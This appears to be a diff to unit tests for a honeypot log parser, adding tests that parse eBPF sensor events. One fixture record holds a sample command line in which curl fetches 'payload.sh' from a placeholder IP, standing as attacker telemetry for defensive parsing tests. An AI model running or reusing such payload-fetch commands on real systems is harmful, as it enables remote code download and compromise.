@@ -5,7 +5,10 @@ from pathlib import Path
 from tempfile import TemporaryDirectory
 import unittest
 
-from honeypot_ai.parsers import TPOT_TYPES, TPOT_TYPE_ALIASES, parse_paths, parse_record
+from honeypot_ai.parsers import TPOT_TYPES, TPOT_TYPE_ALIASES, parse_file, parse_paths, parse_record
+
+
+ROOT = Path(__file__).resolve().parents[1]
 
 
 class ParserTests(unittest.TestCase):
@@ -226,6 +229,38 @@ class ParserTests(unittest.TestCase):
         self.assertEqual(event.source, "zeek")
         self.assertEqual(event.event_type, "zeek.dns")
         self.assertEqual(event.domain, "payload.example")
+
+    def test_ebpf_record(self) -> None:
+        event = parse_record(
+            {
+                "schema_version": 1,
+                "timestamp": "2026-06-16T12:00:02Z",
+                "host": "sensor-a",
+                "event_type": "network_connect",
+                "pid": 1001,
+                "binary": "/usr/bin/curl",
+                "arguments_sample": ["curl", "http://203.0.113.80/payload.sh"],
+                "src_ip": "10.0.5.20",
+                "src_port": 42344,
+                "dest_ip": "203.0.113.80",
+                "dest_port": 80,
+                "protocol": "tcp",
+                "severity_hint": "medium",
+            }
+        )
+
+        self.assertEqual(event.source, "ebpf")
+        self.assertEqual(event.event_type, "ebpf.network_connect")
+        self.assertEqual(event.src_ip, "10.0.5.20")
+        self.assertEqual(event.dest_port, 80)
+        self.assertIn("curl", event.command or "")
+
+    def test_parse_ebpf_fixture(self) -> None:
+        events = parse_file(ROOT / "sample_logs" / "ebpf-events.ndjson")
+
+        self.assertEqual(len(events), 4)
+        self.assertEqual({event.source for event in events}, {"ebpf"})
+        self.assertTrue(any(event.event_type == "ebpf.privilege_change" for event in events))
 
     def test_parse_paths_includes_rotated_json_logs(self) -> None:
         with TemporaryDirectory() as tmp:
